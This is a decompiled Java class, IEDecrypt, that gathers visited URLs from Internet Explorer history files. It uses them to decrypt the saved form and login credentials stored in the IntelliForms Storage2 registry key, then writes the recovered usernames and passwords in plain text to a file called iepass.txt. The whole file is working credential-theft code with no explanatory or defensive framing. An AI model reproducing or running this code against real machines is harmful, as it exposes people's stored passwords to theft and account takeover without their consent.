import java.io.FileNotFoundException;
import java.util.Iterator;
import java.util.Set;
import java.util.TreeMap;
import com.sun.jna.platform.win32.WinCrypt;
import com.sun.jna.platform.win32.Crypt32Util;
import java.nio.charset.Charset;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import java.io.PrintWriter;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.File;
import java.util.LinkedList;
import java.util.HashMap;
import java.util.Queue;

// 
// Decompiled by Procyon v0.5.30
// 

public class IEDecrypt
{
    static String url;
    static Queue<String> que;
    static HashMap<String, String> map;
    static String browser;
    
    static {
        IEDecrypt.url = " ";
        IEDecrypt.que = new LinkedList<String>();
        IEDecrypt.map = new HashMap<String, String>();
        IEDecrypt.browser = "";
    }
    
    public static void setPath(final String b) {
        IEDecrypt.browser = b;
    }
    
    public static void history() throws IOException {
        final String path = String.valueOf(System.getenv("LOCALAPPDATA")) + "\\Microsoft\\Windows\\History";
        final File folder = new File(path);
        File[] listFiles;
        for (int length = (listFiles = folder.listFiles()).length, i = 0; i < length; ++i) {
            final File a = listFiles[i];
            if (a.isDirectory()) {
                File[] listFiles2;
                for (int length2 = (listFiles2 = a.listFiles()).length, j = 0; j < length2; ++j) {
                    final File b = listFiles2[j];
                    if (b.getName().equals("index.dat")) {
                        readFile1(b);
                    }
                    if (b.isDirectory()) {
                        File[] listFiles3;
                        for (int length3 = (listFiles3 = b.listFiles()).length, k = 0; k < length3; ++k) {
                            final File c = listFiles3[k];
                            if (c.getName().equals("index.dat")) {
                                readFile(c);
                            }
                        }
                    }
                }
            }
        }
    }
    
    public static void readFile1(final File file) throws IOException {
        final FileInputStream in = new FileInputStream(file);
        final byte[] b = new byte[(int)file.length()];
        in.read(b);
        int end = 0;
        final byte[] info = new byte[b.length];
        byte[] array;
        for (int length = (array = b).length, i = 0; i < length; ++i) {
            final byte c = array[i];
            if ((c > 32 && c < 126) || c == 0) {
                if (c == 0) {
                    info[end] = 32;
                }
                else {
                    info[end] = c;
                }
                ++end;
            }
        }
        String s = new String(info);
        while (s.indexOf("Visited") > 0) {
            s = s.substring(s.indexOf("Visited") + 7);
            if (s.indexOf("Visited") < 0) {
                if (!s.contains("http")) {
                    continue;
                }
                s = parseURL1(s);
                if (IEDecrypt.map.containsKey(s)) {
                    continue;
                }
                IEDecrypt.map.put(s, null);
                IEDecrypt.que.offer(s);
            }
            else {
                String t = s.substring(0, s.indexOf("Visited"));
                if (!t.contains("http")) {
                    continue;
                }
                t = parseURL1(t);
                if (IEDecrypt.map.containsKey(t)) {
                    continue;
                }
                IEDecrypt.map.put(t, null);
                IEDecrypt.que.offer(t);
            }
        }
    }
    
    public static String parseURL1(String s) {
        s = s.substring(s.indexOf("http"));
        if (s.contains("?")) {
            s = s.substring(0, s.indexOf("?"));
        }
        if (s.contains(" ")) {
            s = s.substring(0, s.indexOf(" "));
        }
        return s;
    }
    
    public static void readFile(final File file) throws IOException {
        final FileInputStream in = new FileInputStream(file);
        final byte[] b = new byte[(int)file.length()];
        in.read(b);
        int end = 0;
        final byte[] info = new byte[b.length];
        byte[] array;
        for (int length = (array = b).length, i = 0; i < length; ++i) {
            final byte c = array[i];
            if (c > 32 && c < 126) {
                info[end] = c;
                ++end;
            }
        }
        String s = new String(info);
        while (s.indexOf("URL") > 0) {
            s = s.substring(s.indexOf("URL") + 3);
            if (s.indexOf("URL") < 0) {
                if (!s.contains("http")) {
                    continue;
                }
                s = parseURL(s);
                if (IEDecrypt.map.containsKey(s)) {
                    continue;
                }
                IEDecrypt.map.put(s, null);
                IEDecrypt.que.offer(s);
            }
            else {
                String t = s.substring(0, s.indexOf("URL"));
                if (!t.contains("http") || IEDecrypt.map.containsKey(t)) {
                    continue;
                }
                t = parseURL(t);
                if (IEDecrypt.map.containsKey(t)) {
                    continue;
                }
                IEDecrypt.map.put(t, null);
                IEDecrypt.que.offer(t);
            }
        }
    }
    
    public static String parseURL(String s) {
        s = s.substring(s.indexOf(":") + 1);
        s = s.substring(s.indexOf(":") + 1);
        s = s.substring(s.indexOf("@") + 1);
        if (s.contains("?")) {
            s = s.substring(0, s.indexOf("?"));
        }
        return s;
    }
    
    public static void registry() throws FileNotFoundException {
        final PrintWriter out = new PrintWriter(String.valueOf(IEDecrypt.browser) + "iepass.txt");
        final TreeMap<String, Object> tree = Advapi32Util.registryGetValues(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2");
        final Set<String> keys = tree.keySet();
        Iterator<String> it = null;
        String key = "";
        while (!IEDecrypt.que.isEmpty()) {
            IEDecrypt.url = IEDecrypt.que.poll().toLowerCase();
            it = keys.iterator();
            while (it.hasNext()) {
                key = it.next();
                final byte[] keys2 = Advapi32Util.registryGetBinaryValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", key);
                try {
                    final byte[] norm = IEDecrypt.url.getBytes(Charset.forName("ASCII"));
                    final byte[] dt = new byte[(norm.length + 1) * 2];
                    for (int i = 0; i < norm.length; ++i) {
                        dt[i * 2] = norm[i];
                    }
                    final byte[] decrypted = Crypt32Util.cryptUnprotectData(keys2, dt, 0, null);
                    final byte[] cleaned = new byte[decrypted.length / 2];
                    out.println(String.valueOf(IEDecrypt.url.toUpperCase()) + ": ");
                    String data = "";
                    for (int j = 34; j < cleaned.length - 1; ++j) {
                        cleaned[j] = decrypted[j * 2];
                        if (cleaned[j] > 32 && cleaned[j] < 126) {
                            data = String.valueOf(data) + (char)cleaned[j];
                        }
                        else if (cleaned[j] == 0) {
                            data = String.valueOf(data) + " | ";
                        }
                    }
                    out.println(data);
                    out.println("-----------------------------");
                }
                catch (Exception ex) {}
            }
        }
        out.close();
    }
}
